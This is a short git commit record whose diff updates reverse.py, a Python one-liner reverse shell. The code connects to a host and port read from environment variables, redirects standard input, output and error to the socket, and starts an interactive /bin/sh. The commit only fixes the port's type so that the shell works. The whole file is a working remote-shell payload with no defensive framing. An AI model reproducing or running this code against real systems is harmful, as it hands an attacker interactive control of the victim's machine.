c3109d13180d9e9eaa48ccc92c2761983be6db62
Pablo Bartolome <pbartolome@users.noreply.github.com>
2017-10-11 14:02:02 +0200

    Update reverse.py

--- reverse.py
+++ reverse.py
@@ -1,1 +1,1 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.environ["URL"],os.environ["PORT"]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.environ["URL"],int(os.environ["PORT"])));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
